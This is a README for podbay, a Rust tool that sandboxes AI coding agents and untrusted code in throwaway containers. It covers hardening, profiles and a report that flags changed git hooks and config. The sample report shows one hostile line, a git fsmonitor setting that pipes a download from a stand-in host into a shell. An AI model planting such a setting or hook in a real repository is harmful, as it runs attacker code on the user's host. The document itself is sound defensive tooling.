# Podbay

Disposable containers for working in a codebase, including running AI coding
agents and code you don't fully trust, without handing them your machine.

`podbay run` starts a throwaway container around a project directory. The
project is mounted read-write at `/home/dev/workspace/repomount`, and
everything else is something you declared:

- dotfiles mounted read-only
- named volumes for state that should outlive the container
- tools that mise installs on top of what the project asks for
- optional root build scripts baked into a derived image

Anything that needs root, such as changes to the image, can only come from
your own config directory, never from the mounted project.

## Status

Being rebuilt in Rust, in stages:

1. **Rust port** with real config parsing, Podman and Docker backends, tests
   and CI. *(done)*
2. **Threat model**, plus a session report that flags changes to git hooks and
   config. *(done)*
3. **Container hardening**: dropped capabilities, `no-new-privileges`,
   read-only root filesystem, resource limits. *(done)*
4. Network policy: no network by default, with an allowlist enforced by a
   filtering proxy. Tool installs move to a separate provisioning step.
5. Landlock and seccomp around processes inside the container.
6. A native rootless runtime, with Podman and Docker kept as fallbacks.

[THREAT_MODEL.md](THREAT_MODEL.md) covers what is and isn't protected
today, and which stage closes each gap. The two biggest: the container has
full network access until stage 4, and the project is mounted read-write, so
code inside can plant git hooks or config that run on your host the next
time you use git there. The [session report](#session-report) tells you when
that has happened.

## Install

```
cargo install --path .
```

You need Podman or Docker. Podman is preferred when both are installed
because it is rootless by default. With rootful Docker, a container escape is
root on the host, and podbay says so on every run.

## Quick start

```
podbay run ~/src/some-project
```

The first run builds the bundled base image: Debian slim, a non-root `dev`
user and mise, verified against its signing key. Inside, mise installs
whatever the project's own config (`.mise.toml`, `.nvmrc`, ...) asks for.

```
podbay run . -- make test     # run a command instead of a shell
podbay run --dry-run .        # print the exact podman/docker command
podbay build                  # build or refresh the images ahead of time
```

podbay's exit code is the command's (or the shell's) exit code.

Files the container creates in your project are owned by you on the host. On
rootless Podman, `dev` is mapped onto your user with `keep-id`. On rootful
Docker, podbay builds one more small image layer that gives `dev` your uid
and gid.

## What a session can do

- **Write**: the project, volumes, read-write mounts, and three scratch
  areas: `/home/dev`, `/tmp` and `/var/tmp`. The rest of the filesystem is
  read-only. The home directory is a fresh tmpfs every session, copied from
  the image at start. Anything worth keeping belongs in the project or a
  volume.
- **Privileges**: none. The session runs as `dev` with no capabilities and
  `no-new-privileges`, so setuid binaries and `sudo` don't work. The
  entrypoint starts with just enough to set up the home directory and fix
  mount ownership, then drops all of it before your command runs. A profile
  can keep specific capabilities with `cap_add` (see below).
- **Resources**: at most 4096 processes and threads by default. Memory and
  CPU limits are opt-in. Rootless engines can apply a limit only when
  systemd delegates that cgroup controller to your user. When it doesn't,
  podbay warns and runs without that limit.

## Session report

When the container exits, podbay reports anything it changed that the host
will act on later: git hooks, git config, the `.git` entry itself, nested
repositories, and a few files that editors and shells run (`.envrc`,
`.vscode/`, mise config).

```
podbay: session report: 2 warnings, 1 notice
  warning: .git/config: settings changed
            + core.fsmonitor = curl -s evil.example | sh   [can run commands]
  warning: .git/hooks/post-checkout: added, an executable file
  notice:  .envrc: changed during the session (direnv runs it in your shell once allowed)
podbay: git and other tools on the host act on these files. Inspect them before running git in /home/me/src/app
```

A clean session ends with one line:
`podbay: session report: no changes to git hooks or config`.

A warning means don't run git in that project on the host until you've
looked at the files it lists. Legitimate work can trigger it too, for
example when the container runs `git checkout -b x --track` and that
writes branch settings. The settings list makes that easy to tell apart.
The report detects changes; it doesn't revert them.
[THREAT_MODEL.md](THREAT_MODEL.md) lists what it covers and its limits.

## Profiles

A profile is a single TOML file in `~/.config/podbay/profiles/`:

```
podbay profile init base
podbay profile init ai --extends base
podbay profile show ai        # everything ai resolves to, inheritance merged
podbay run -p ai .
```

If you don't pass `-p`, podbay uses `default_profile` from `config.toml`,
otherwise a profile named `default` if one exists.

```toml
# ~/.config/podbay/profiles/base.toml

# Bind mounts from the host, read-only unless mode = "rw".
[[mount]]
host = "~/.gitconfig"
container = "/home/dev/.gitconfig"

[[mount]]
host = "~/.zshrc"
container = "/home/dev/.zshrc"
```

```toml
# ~/.config/podbay/profiles/ai.toml
extends = ["base"]

# Optional: a root build script for system packages mise can't install.
# Relative to the profiles directory; must start with a shebang.
extension = "ai.sh"

# Named volumes keep tool state across runs. Stored as podbay-ai-<name>.
[[volume]]
name = "opencode-config"
container = "/home/dev/.config/opencode"

[[volume]]
name = "opencode-data"
container = "/home/dev/.local/share/opencode"

# Tools mise installs in every session, on top of the project's own.
[tools]
opencode = "latest"
```

```toml
# ~/.config/podbay/profiles/debug.toml
extends = ["base"]

# Capabilities the session keeps (none by default). podbay prints them on
# every run that uses this profile.
cap_add = ["SYS_PTRACE"]   # gdb, strace

# Override the limits from config.toml.
[limits]
memory = "16g"
```

With `extends`, ancestors are applied first. A later profile's mount or
volume replaces an inherited one at the same container path, and its tools
override inherited versions. `cap_add` lists are combined, and `[limits]`
keys override one at a time. Volumes keep the name of the profile that
declared them, so every profile extending `base` shares `base`'s volumes.

**Mounts or volumes?** Use mounts for files you own and edit on the host. Use
volumes for directories the container creates or writes into, since the home
directory is wiped after every session. The engine creates a missing mount
point's parent directories as root, and the entrypoint gives them to `dev`.

**Extensions** are layered as derived images (`podbay-<profile>:<hash>`).
Each tag is a hash of the script and its parent image, so editing a script,
or any script below it in the chain, rebuilds exactly what changed.
Extensions run as root at build time, the only time the root filesystem is
writable. Anything they put in `/home/dev` is copied into the home skeleton
automatically.

## Configuration

`~/.config/podbay/config.toml` (all keys optional):

```toml
backend = "podman"           # or "docker"; default: podman if installed
default_profile = "base"
base_image = "my/image:tag"  # use your own image instead of the bundled one

[limits]                     # profiles can override each key
pids = 4096                  # processes and threads; 0 for no limit
memory = "8g"                # default: no limit
cpus = 4                     # default: no limit
```

A custom base image must provide a `dev` user, `setpriv`, podbay's
entrypoint, and a copy of `/home/dev` at `/usr/local/share/podbay/home` to
seed the home directory from (see `base/Containerfile`).

`PODBAY_CONFIG_DIR` and `PODBAY_CACHE_DIR` move podbay's config and cache
directories without touching `HOME` or `XDG_*`. Rootless Podman uses those to
find its own storage.

## A note on mise and trust

mise can install tools from many sources, and some of its backends run
arbitrary code at install time. By default, installed tools live in one
shared volume (`podbay-mise-data`), so a malicious project could leave
something behind that other projects then pick up. For code you don't trust,
`--local-cache` keeps that project's installs in
`~/.cache/podbay/mise/<repo-key>/`. Review a project's mise config before
letting it install anything.

## Development

```
cargo test                          # unit, CLI and end-to-end tests
PODBAY_TEST_BACKEND=podman cargo test
```

The end-to-end tests run real containers on Docker (or the engine named by
`PODBAY_TEST_BACKEND`) and are skipped when that engine isn't available. They
use a small stand-in for the base image (`tests/fixtures/test-base`) with the
same entrypoint, so they don't need to build the full toolchain. One of them
plays a hostile session and checks that the session report catches it.
